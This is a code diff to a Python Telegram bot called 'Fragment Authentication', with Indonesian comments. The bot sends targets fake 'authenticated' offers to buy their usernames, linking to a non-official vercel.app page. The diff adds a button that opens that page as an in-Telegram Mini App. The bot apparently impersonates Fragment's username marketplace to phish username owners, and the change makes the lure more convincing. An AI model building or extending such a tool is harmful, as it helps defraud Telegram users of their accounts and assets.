@@ -1,7 +1,8 @@
 import logging
 import os
 import sys
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InlineQueryResultArticle, InputTextMessageContent, error
+# Pastikan WebAppInfo diimpor
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InlineQueryResultArticle, InputTextMessageContent, error, WebAppInfo
 from telegram.ext import Application, CommandHandler, InlineQueryHandler, CallbackQueryHandler, ContextTypes
 import uuid
 import hashlib
@@ -12,6 +13,10 @@ BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
 AUTH_CODE = os.getenv('AUTH_CODE', '1234').strip()
 PORT = int(os.getenv('PORT', 8443))
 WEBHOOK_URL = os.getenv('WEBHOOK_URL', '').strip()
+# --- KONFIGURASI BARU UNTUK MINI APP ---
+# Ganti 'https://YOUR_MINI_APP_URL' dengan URL Web App Anda yang sebenarnya
+WEB_APP_URL = os.getenv('WEB_APP_URL', 'https://fragment-authentication.vercel.app/').strip() 
+# ---------------------------------------
 
 # Setup logging
 logging.basicConfig(
@@ -36,6 +41,7 @@ def generate_details_url(username: str) -> str:
         encoded_username = urllib.parse.quote(username)
         return f"{WEBHOOK_URL}/details?username={encoded_username}"
     else:
+        # Placeholder jika WEBHOOK_URL tidak diset
         return f"https://fragment-authentication.vercel.app/"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -55,7 +61,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"3. Bot akan kirim offer untuk username tersebut\n\n"
         f"**Format:** `@{bot_username} [kode] [username]`\n"
         f"**Kode auth:** `{AUTH_CODE}`\n\n"
-        "🔗 **View Details:** Akan membuka halaman web dengan detail lengkap"
+        "🔗 **View Details:** Akan membuka halaman web dengan detail lengkap\n"
+        "🚀 **Buka Mini App:** Akan membuka Web App Telegram secara langsung" # <--- Keterangan baru
     )
     
     try:
@@ -94,13 +101,27 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
         # Generate URL untuk view details
         details_url = generate_details_url(target_username)
         
+        # --- LOGIKA TOMBOL BARU ---
+        keyboard_buttons = [
+            # Tombol View Details (URL biasa)
+            [InlineKeyboardButton("📋 View Details", url=details_url)], 
+        ]
+        
+        if WEB_APP_URL:
+            # Tambahkan tombol Buka Mini App (Web App)
+            # Menggunakan WebAppInfo untuk meluncurkan Web App secara native di Telegram
+            keyboard_buttons.append(
+                [InlineKeyboardButton("🚀 Buka Mini App", web_app=WebAppInfo(url=WEB_APP_URL))]
+            )
+        # -------------------------
+
         # Format pesan dengan HTML parsing
         message_text = (
             "🔐 <b>Fragment Authentication</b>\n\n"
             f"Direct offer to sell your username: <code>{target_username}</code>\n\n"
             f"<b>Status:</b> ✅ Authenticated\n"
             f"<b>Target:</b> {escaped_username}\n\n"
-            f"<i>Click 'View Details' for more information</i>"
+            f"<i>Click 'View Details' atau 'Buka Mini App' for more information</i>" # <--- Pesan diperbarui
         )
         
         results.append(
@@ -112,10 +133,8 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
                     message_text=message_text,
                     parse_mode="HTML"
                 ),
-                # Hanya tombol 'View Details' yang tersisa
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("📋 View Details", url=details_url)],
-                ])
+                # Menggunakan keyboard_buttons yang sudah diperbarui
+                reply_markup=InlineKeyboardMarkup(keyboard_buttons) 
             )
         )
     
@@ -204,8 +223,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Error answering callback: {e}")
         return
     
-    # Meskipun tombol 'close' sudah dihapus dari CASE 1,
-    # kita biarkan logic ini untuk jaga-jaga atau untuk tombol lain di masa depan.
     if query.data == "close":
         try:
             await query.message.delete()
@@ -225,6 +242,7 @@ def main():
     logger.info(f"Starting Fragment Authentication Bot")
     logger.info(f"AUTH_CODE: {AUTH_CODE}")
     logger.info(f"WEBHOOK_URL: {WEBHOOK_URL}")
+    logger.info(f"WEB_APP_URL: {WEB_APP_URL}") # <--- Log baru
 
     application = Application.builder().token(BOT_TOKEN).build()
     
